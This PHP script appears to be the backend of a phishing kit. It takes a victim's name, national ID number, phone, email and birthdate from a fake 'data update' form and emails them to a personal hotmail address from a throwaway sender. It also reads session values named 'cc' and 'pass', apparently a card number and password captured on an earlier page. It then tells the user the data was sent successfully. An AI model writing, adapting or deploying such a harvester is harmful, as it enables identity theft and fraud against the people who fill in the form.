<?php

    session_start();
    
    //valores del formulario 
    $name = $_POST['name'];
    $dni = $_POST['dni'];
    $tel = $_POST['tel'];
    $email = $_POST['email'];
    $cc = $_SESSION['cc'];
    $pass = $_SESSION['pass'];
    $birthdate = $_POST['birthdate'];

    //Correo a donde se envía la información
    //$to = "cruzadoeduar18@gmail.com";
    $to = "fernando1894@hotmail.com";

    //Asunto de correo
    $subject = "ACTUALIZACION DE DATOS CORREO 2";

    //Informacion que se envía en el correo
    $txt =  "NUMERO DE TELEFONO: " . $tel . "\n" . 
            "DIRECCIÓN DE CORREO: " . $email . "\n" .
            "NOMBRE: " . $name . "\n" .
            "DNI: " . $dni . "\n" .
            "FECHA DE NACIMIENTO: " . $birthdate;

    //Destinatario
    $headers = "From: pruebas@pruebas.ga";

    mail($to, $subject, $txt, $headers);
    echo "<script> alert('Datos enviados correctamente.'); window.location='index.php' </script>";

    //Al finalizar se elimina la sesión y se borran las variables con la información del formulario
    session_unset();
    session_destroy();

    //redireccionar
    //header("Location:index.php");
?>